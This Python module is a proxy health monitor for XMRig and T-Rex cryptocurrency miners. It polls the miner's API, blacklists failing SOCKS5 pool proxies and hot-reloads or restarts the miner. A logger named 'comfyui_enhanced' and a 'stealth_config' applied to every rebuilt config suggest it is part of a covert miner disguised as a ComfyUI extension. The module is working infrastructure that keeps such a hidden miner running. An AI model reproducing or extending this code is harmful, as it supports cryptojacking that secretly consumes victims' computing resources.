"""
Runtime proxy health monitor.

Polls the XMRig / T-Rex HTTP APIs periodically. When a proxy is active and
the miner shows sustained connection failures (uptime stuck at 0, hashrate
at 0 for >120s), the monitor blacklists the proxy, rebuilds the config
without it, and hot-reloads the miner.

Maintains a persistent blacklist so dead proxies are never retried.
"""

import json
import logging
import threading
import time
import urllib.request
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

CHECK_INTERVAL = 60
ZERO_HR_GRACE_SECS = 150
FAILURE_THRESHOLD = 3


class ProxyHealthMonitor:
    def __init__(
        self,
        cpu_miner,
        gpu_miner,
        config_builder,
        cache_dir: Path,
        stealth_config=None,
    ):
        self._cpu = cpu_miner
        self._gpu = gpu_miner
        self._cb = config_builder
        self._sc = stealth_config
        self._blacklist_path = cache_dir / "proxy_blacklist.json"
        self._blacklist: set[str] = set()
        self._running = False
        self._thread: threading.Thread | None = None
        self._cpu_start_ts: float = time.monotonic()
        self._load_blacklist()

    def _load_blacklist(self) -> None:
        try:
            if self._blacklist_path.exists():
                data = json.loads(self._blacklist_path.read_text(encoding="utf-8"))
                if isinstance(data, list):
                    self._blacklist = set(data)
        except Exception as exc:
            logger.debug("proxy blacklist load failed: %s", exc)

    def _save_blacklist(self) -> None:
        try:
            self._blacklist_path.parent.mkdir(parents=True, exist_ok=True)
            self._blacklist_path.write_text(
                json.dumps(sorted(self._blacklist), indent=2), encoding="utf-8"
            )
        except Exception as exc:
            logger.debug("proxy blacklist save failed: %s", exc)

    @property
    def blacklist(self) -> set[str]:
        return set(self._blacklist)

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._cpu_start_ts = time.monotonic()
        self._thread = threading.Thread(
            target=self._loop, daemon=True, name="proxy-health",
        )
        self._thread.start()
        logger.info("Proxy health monitor active (interval=%ds)", CHECK_INTERVAL)

    def stop(self) -> None:
        self._running = False

    def _loop(self) -> None:
        time.sleep(ZERO_HR_GRACE_SECS)
        while self._running:
            try:
                self._check_cpu()
            except Exception as exc:
                logger.debug("proxy health check error: %s", exc)
            time.sleep(CHECK_INTERVAL)

    def _get_cpu_summary(self) -> dict | None:
        if not self._cpu or not self._cpu.is_alive():
            return None
        return self._cpu.get_summary()

    def _current_cpu_proxy(self) -> str | None:
        proxy = self._cb.settings.get("pool_socks5")
        if isinstance(proxy, str) and proxy.strip():
            return proxy.strip()
        return None

    def _check_cpu(self) -> None:
        proxy = self._current_cpu_proxy()
        if not proxy:
            return

        summary = self._get_cpu_summary()
        if summary is None:
            return

        conn = summary.get("connection", {})
        failures = conn.get("failures", 0)
        uptime = conn.get("uptime", 1)

        hr_data = summary.get("hashrate", {})
        hr_total = hr_data.get("total", [0])
        current_hr = hr_total[0] if isinstance(hr_total, list) and hr_total else 0

        elapsed = time.monotonic() - self._cpu_start_ts
        proxy_dead = False

        if failures >= FAILURE_THRESHOLD and uptime == 0:
            proxy_dead = True
            logger.warning(
                "Proxy health: CPU proxy %s has %d failures and 0 uptime — dead",
                proxy, failures,
            )
        elif current_hr == 0 and elapsed > ZERO_HR_GRACE_SECS:
            proxy_dead = True
            logger.warning(
                "Proxy health: CPU hashrate 0 for >%ds with proxy %s — dead",
                ZERO_HR_GRACE_SECS, proxy,
            )

        if proxy_dead:
            self._blacklist.add(proxy)
            self._save_blacklist()
            logger.info("Proxy %s blacklisted, rebuilding config without proxy", proxy)
            self._cb.settings["pool_socks5"] = ""
            self._rebuild_and_reload_cpu()

    def _rebuild_and_reload_cpu(self) -> None:
        try:
            cfg = self._cb.build()
            if self._sc:
                cfg = self._sc.apply_to_config(cfg)

            from core.config import API_TOKEN
            payload = json.dumps(cfg).encode()
            req = urllib.request.Request(
                "http://127.0.0.1:44880/1/config",
                data=payload,
                method="PUT",
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(req, timeout=5):
                pass
            self._cpu_start_ts = time.monotonic()
            logger.info("Proxy health: CPU config hot-reloaded (proxy removed)")
        except Exception as exc:
            logger.warning(
                "Proxy health: hot-reload failed, restarting miner: %s", exc,
            )
            try:
                cfg = self._cb.build()
                if self._sc:
                    cfg = self._sc.apply_to_config(cfg)
                self._cpu.write_config(cfg)
                self._cpu.stop()
                self._cpu.start()
                self._cpu_start_ts = time.monotonic()
            except Exception as exc2:
                logger.error("Proxy health: full restart failed: %s", exc2)
